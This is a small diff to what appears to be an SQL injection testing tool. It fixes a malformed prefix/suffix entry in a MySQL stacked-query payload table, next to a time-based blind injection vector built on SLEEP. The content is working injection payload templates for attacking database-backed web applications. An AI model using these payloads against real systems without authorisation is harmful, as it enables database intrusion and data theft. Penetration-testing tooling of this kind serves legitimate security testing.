@@ -305,7 +305,7 @@ PAYLOADS = {
                     {"pref": "');", "suf": "--"},
                     {"pref": '");', "suf": "--"},
                     {"pref": "',", "suf": "--"},
-                    {"pref": '",', "suf": "-- {"pref": "--", "suf": ""},
+                    {"pref": '"', "suf": "--"},
                 ],
                 "title": "MySQL >= 5.0.12 stacked queries (query SLEEP)",
                 "vector": "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
